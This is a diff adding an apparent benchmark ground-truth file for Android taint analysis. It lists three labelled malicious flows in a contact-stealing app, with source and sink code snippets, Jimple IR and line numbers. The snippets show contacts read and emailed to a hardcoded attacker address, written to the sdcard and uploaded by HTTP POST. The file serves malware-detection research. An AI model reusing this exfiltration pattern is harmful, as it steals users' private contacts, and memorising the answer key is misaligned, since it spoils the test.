@@ -1,0 +1,266 @@
+{
+  "fileName": "beita_com_beita_contact.apk",
+  "day": "2019-10-24",
+  "findings": [
+    {
+      "source": {
+        "statement": "Cursor cursor = cr.query(Contacts.CONTENT_URI, null, null, null, null);",
+        "methodName": "public List<Person> getContactsInfoListFromPhone()",
+        "className": "com.beita.contact.MyContacts",
+        "lineNo": 182,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r4, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "transport.sendMessage(message, message.getAllRecipients());",
+        "methodName": "public static void sendByJavaMail(String str_from, String str_to, String str_title, String str_content)",
+        "className": "com.beita.contact.MailUtil",
+        "lineNo": 50,
+        "targetName": "sendMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r10.<javax.mail.Transport: void sendMessage(javax.mail.Message,javax.mail.Address[])>($r5, $r11)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "person.setName(cursor.getString(cursor.getColumnIndex(\"display_name\")));",
+          "methodName": "public List<Person> getContactsInfoListFromPhone()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 188,
+          "ID": 1
+        },
+        {
+          "statement": "list.add(person);",
+          "methodName": "public List<Person> getContactsInfoListFromPhone()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 225,
+          "ID": 2
+        },
+        {
+          "statement": "return list;",
+          "methodName": "public List<Person> getContactsInfoListFromPhone()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 228,
+          "ID": 3
+        },
+        {
+          "statement": "for (Person person : getContactsInfoListFromPhone()) {",
+          "methodName": "public boolean backup()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": -1,
+          "ID": 4
+        },
+        {
+          "statement": "stringBuffer.append(\"name : \" + person.getName() + \"\\nphone : \");",
+          "methodName": "public boolean backup()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 143,
+          "ID": 5
+        },
+        {
+          "statement": "this.sb.append(stringBuffer.toString());",
+          "methodName": "public boolean backup()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 153,
+          "ID": 6
+        },
+        {
+          "statement": "this.sendCotentString = this.sb.toString();",
+          "methodName": "public boolean backup()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 155,
+          "ID": 7
+        },
+        {
+          "statement": "MyContacts.this.backup();",
+          "methodName": "public void onPostExecute(List<Person> result)",
+          "className": "com.beita.contact.MyContacts.RetrieceDataTask",
+          "lineNo": 116,
+          "ID": 8
+        },
+        {
+          "statement": "new UploadAsyncTask().execute(new Void[0]);",
+          "methodName": "public void onPostExecute(List<Person> result)",
+          "className": "com.beita.contact.MyContacts.RetrieceDataTask",
+          "lineNo": 117,
+          "ID": 9
+        },
+        {
+          "statement": "MailUtil.sendByJavaMail(\"zhangdafeng2012@126.com\", \"zhangdafeng2012@126.com\", new StringBuilder(String.valueOf(System.currentTimeMillis())).toString(), l.a(MyContacts.this.sendCotentString));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.beita.contact.MyContacts.UploadAsyncTask",
+          "lineNo": 127,
+          "ID": 10
+        },
+        {
+          "statement": "message.setText(str_content, \"utf-8\");",
+          "methodName": "public static void sendByJavaMail(String str_from, String str_to, String str_title, String str_content)",
+          "className": "com.beita.contact.MailUtil",
+          "lineNo": 40,
+          "ID": 11
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "collections": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow leaks contact data via email.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Cursor phone = cr.query(Phone.CONTENT_URI, null, \"contact_id = \" + contactId, null, null);",
+        "methodName": "public List<Person> getContactsInfoListFromPhone()",
+        "className": "com.beita.contact.MyContacts",
+        "lineNo": 194,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r4, null, $r8, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "bw.write(new StringBuilder(String.valueOf(contentStr)).append(\"\\n\").toString());",
+        "methodName": "public static void write(String filePath, String contentStr)",
+        "className": "com.beita.contact.ContactUtil",
+        "lineNo": 12,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r2.<java.io.BufferedWriter: void write(java.lang.String)>($r0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "person.addPhones(phone.getString(phone.getColumnIndex(\"data1\")));",
+          "methodName": "public List<Person> getContactsInfoListFromPhone()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 200,
+          "ID": 1
+        },
+        {
+          "statement": "list.add(person);",
+          "methodName": "public List<Person> getContactsInfoListFromPhone()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 225,
+          "ID": 2
+        },
+        {
+          "statement": "return list;",
+          "methodName": "public List<Person> getContactsInfoListFromPhone()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 228,
+          "ID": 3
+        },
+        {
+          "statement": "for (Person person : getContactsInfoListFromPhone()) {",
+          "methodName": "public boolean backup()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": -1,
+          "ID": 4
+        },
+        {
+          "statement": "for (String string : person.getPhones()) {",
+          "methodName": "public boolean backup()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": -1,
+          "ID": 5
+        },
+        {
+          "statement": "stringBuffer.append(new StringBuilder(String.valueOf(string)).append(\",\").toString());",
+          "methodName": "public boolean backup()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 145,
+          "ID": 6
+        },
+        {
+          "statement": "ContactUtil.write(Application.sdcardPathString + \"/contact_backup.txt\", stringBuffer.toString());",
+          "methodName": "public boolean backup()",
+          "className": "com.beita.contact.MyContacts",
+          "lineNo": 152,
+          "ID": 7
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "collections": true,
+        "partialFlow": true
+      },
+      "ID": 2,
+      "description": "This malicious partial flow leaks contact data into a file (that is later uploaded).",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "FileInputStream fis = new FileInputStream(srcPath);",
+        "methodName": "public static void uploadFile()",
+        "className": "com.beita.contact.UploadUtil",
+        "lineNo": 43,
+        "targetName": "FileInputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r8.<java.io.FileInputStream: void <init>(java.lang.String)>($r4)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "dos.write(buffer, 0, count);",
+        "methodName": "public static void uploadFile()",
+        "className": "com.beita.contact.UploadUtil",
+        "lineNo": 65,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<java.io.DataOutputStream: void write(byte[],int,int)>($r9, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int count = fis.read(buffer);",
+          "methodName": "public static void uploadFile()",
+          "className": "com.beita.contact.UploadUtil",
+          "lineNo": 46,
+          "ID": 1
+        },
+        {
+          "statement": "boundary = new BufferedReader(new InputStreamReader(buffer, \"utf-8\")).readLine();",
+          "methodName": "public static void uploadFile()",
+          "className": "com.beita.contact.UploadUtil",
+          "lineNo": 59,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "partialFlow": true,
+        "pathConstraints": true
+      },
+      "ID": 3,
+      "description": "This malicious partial flow uploads the file containing contact data to a remote server via HTTP POST request.",
+      "isNegative": false
+    }
+  ]
+}
